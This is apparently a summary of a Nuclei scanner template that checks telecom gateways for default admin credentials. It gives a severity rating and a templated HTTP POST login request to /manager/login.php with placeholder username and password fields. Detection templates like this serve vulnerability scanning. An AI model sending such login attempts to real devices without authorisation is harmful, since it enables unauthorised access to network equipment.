# Nuclei Template: Telecom Gateway - Default Admin Login
**Template ID:** telecom-gateway-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`telecom-gateway-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Telecom Gateway default admin login credentials were successful.

## Steps to reproduce / Exploit Payload
```http
POST /manager/login.php HTTP/1.1
Host: {{Hostname}}

Name={{username}}&Pass={{password}}
```

